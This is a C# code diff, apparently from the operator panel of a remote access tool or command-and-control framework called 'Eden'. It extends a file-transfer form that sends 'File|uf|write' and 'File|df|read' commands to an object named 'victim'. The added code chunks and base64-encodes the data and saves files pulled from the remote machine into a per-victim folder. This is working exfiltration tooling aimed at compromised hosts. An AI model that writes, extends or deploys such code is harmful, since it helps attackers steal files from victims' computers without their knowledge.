@@ -70,20 +70,56 @@ namespace Eden
                                 return;
                             }
 
+                            if (!m_dicTransferFile.ContainsKey(szFilePath))
+                                return;
+
                             clsTransferFileHandler handler = m_dicTransferFile[szFilePath];
                             fnUpdateProgress(handler, nIndex);
-                            fnSendNextChunk(handler, szFilePath);
+
+                            if (handler.fnbIsDone())
+                            {
+                                if (m_qTransferFile.Count == 0)
+                                    return;
+
+                                handler = m_qTransferFile.Dequeue();
+                                string szDestFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(handler.m_szRemoteFilePath)).Replace("\\", "/");
+                                fnSendNextChunk(handler, szDestFilePath);
+                            }
+                            else
+                            {
+                                fnSendNextChunk(handler, szFilePath);
+                            }
                         }
                     }
                     else if (aszMsg[1] == "df")
                     {
                         string szFilePath = aszMsg[2];
                         int nIndex = int.Parse(aszMsg[3]);
-                        int nFileSize = int.Parse(aszMsg[4]);
-                        byte[] abBuffer = Convert.FromBase64String(aszMsg[5]);
+                        long nFileSize = long.Parse(aszMsg[4]);
+                        byte[] abBuffer = Convert.FromBase64String(EZCrypto.Encoder.b64d2str(aszMsg[5]));
 
                         if (m_dicTransferFile.ContainsKey(szFilePath))
-                            m_dicTransferFile[szFilePath].fnbWriteChunk(nIndex, abBuffer);
+                        {
+                            var handler = m_dicTransferFile[szFilePath];
+                            handler.m_nFileSize = nFileSize;
+                            handler.m_nChunkSize = m_nChunkSize;
+                            handler.fnbWriteChunk(nIndex, abBuffer);
+
+                            fnUpdateProgress(handler, nIndex);
+
+                            if (handler.fnbIsDone())
+                            {
+                                if (m_qTransferFile.Count == 0)
+                                    return;
+
+                                handler = m_qTransferFile.Dequeue();
+                                fnReadNextChunk(handler);
+                            }
+                            else
+                            {
+                                fnReadNextChunk(handler);
+                            }
+                        }
                     }
                 }
             }
@@ -103,36 +139,13 @@ namespace Eden
         {
             Invoke(new Action(() =>
             {
-                double dProgress = (double)(nIndex / handler.fnGetChunkCount()) * 100;
-                ListViewItem item = listView1.FindItemWithText(handler.m_szFilePath, true, 0);
+                double dProgress = (double)(handler.m_nIndex / handler.fnGetChunkCount()) * 100;
+                ListViewItem item = listView1.FindItemWithText(handler.m_szRemoteFilePath, true, 0);
 
                 if (handler.fnbIsDone())
                 {
                     item.SubItems[2].Text = "OK";
-
-                    if (m_qTransferFile.Count == 0)
-                        return;
-
-                    clsTransferFileHandler handler = m_qTransferFile.Dequeue();
-                    string szDestFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(handler.m_szFilePath)).Replace("\\", "/");
-                    
-                    int nRead = 0;
-                    int nIndex = 0;
-                    byte[] abBuffer = new byte[m_nChunkSize];
-
-                    (nRead, nIndex, abBuffer) = handler.fnabGetChunk();
-
-                    m_victim.fnSendCommand(string.Join("|", new string[]
-                    {
-                        "File",
-                        "uf",
-                        "write",
-                        szDestFilePath,
-                        nIndex.ToString(),
-                        m_nChunkSize.ToString(),
-                        "0",
-                        EZCrypto.Encoder.stre2b64(Convert.ToBase64String(abBuffer)),
-                    }), false);
+                    handler.fnClose();
                 }
                 else
                 {
@@ -167,37 +180,65 @@ namespace Eden
                 EZCrypto.Encoder.stre2b64(Convert.ToBase64String(abBuffer)),
             }), false);
         }
+        void fnReadNextChunk(clsTransferFileHandler handler)
+        {
+            m_victim.fnSendCommand(string.Join("|", new string[]
+            {
+                "File",
+                "df",
+                "read",
+                handler.m_nIndex.ToString(),
+                m_nChunkSize.ToString(),
+                handler.m_szRemoteFilePath,
+            }));
+        }
 
         void fnStartTransfer(Queue<clsTransferFileHandler> qTransfer)
         {
             var handler = qTransfer.Dequeue();
-            int nRead = 0;
-            byte[] abBuffer = new byte[m_nChunkSize];
-            int nIndex = 0;
 
-            string szDestFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(handler.m_szFilePath)).Replace("\\", "/");
-
-            try
+            if (m_transferType == TransferFileType.UploadFile)
             {
-                (nRead, nIndex, abBuffer) = handler.fnabGetChunk();
-                if (nRead == 0)
-                    return;
+                int nRead = 0;
+                byte[] abBuffer = new byte[m_nChunkSize];
+                int nIndex = 0;
 
+                string szDestFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(handler.m_szRemoteFilePath)).Replace("\\", "/");
+
+                try
+                {
+                    (nRead, nIndex, abBuffer) = handler.fnabGetChunk();
+                    if (nRead == 0)
+                        return;
+
+                    m_victim.fnSendCommand(string.Join("|", new string[]
+                    {
+                        "File",
+                        "uf",
+                        "write",
+                        szDestFilePath,
+                        nIndex.ToString(),
+                        m_nChunkSize.ToString(),
+                        "0",
+                        EZCrypto.Encoder.stre2b64(Convert.ToBase64String(abBuffer)),
+                    }), false);
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                }
+            }
+            else
+            {
                 m_victim.fnSendCommand(string.Join("|", new string[]
                 {
                     "File",
-                    "uf",
-                    "write",
-                    szDestFilePath,
-                    nIndex.ToString(),
+                    "df",
+                    "read",
+                    handler.m_nIndex.ToString(),
                     m_nChunkSize.ToString(),
-                    "0",
-                    EZCrypto.Encoder.stre2b64(Convert.ToBase64String(abBuffer)),
-                }), false);
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show(ex.Message);
+                    handler.m_szRemoteFilePath,
+                }));
             }
         }
 
@@ -215,11 +256,22 @@ namespace Eden
 
                 listView1.Items.Add(item);
 
-                var handle = new clsTransferFileHandler(szFilePath);
-                string szDestFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(szFilePath)).Replace("\\", "/");
+                string szSaveDirPath = Path.Combine(new string[] { m_victim.m_szDirectory, "File" });
+                if (!Directory.Exists(szSaveDirPath))
+                    Directory.CreateDirectory(szSaveDirPath);
 
-                m_qTransferFile.Enqueue(handle);
-                m_dicTransferFile[szDestFilePath] = handle;
+                string szLocalFilePath = string.Empty;
+                if (m_transferType == TransferFileType.UploadFile)
+                    szLocalFilePath = szFilePath;
+                else
+                    szLocalFilePath = Path.Combine(szSaveDirPath, Path.GetFileName(szFilePath));
+
+                string szRemoteFilePath = Path.Combine(m_szCurrentDir, Path.GetFileName(szFilePath)).Replace("\\", "/");
+
+                var handler = new clsTransferFileHandler(m_transferType, szLocalFilePath, szRemoteFilePath);
+
+                m_qTransferFile.Enqueue(handler);
+                m_dicTransferFile[szRemoteFilePath] = handler;
             }
 
             //Start
@@ -240,6 +292,12 @@ namespace Eden
         private void frmFileTransfer_FormClosed(object sender, FormClosedEventArgs e)
         {
             m_victim.m_clnt.ServerMessageReceived -= fnSrvRecv;
+
+            foreach (string szFileName in m_dicTransferFile.Keys)
+            {
+                var handler = m_dicTransferFile[szFileName];
+                handler.fnClose();
+            }
         }
 
         //Pause
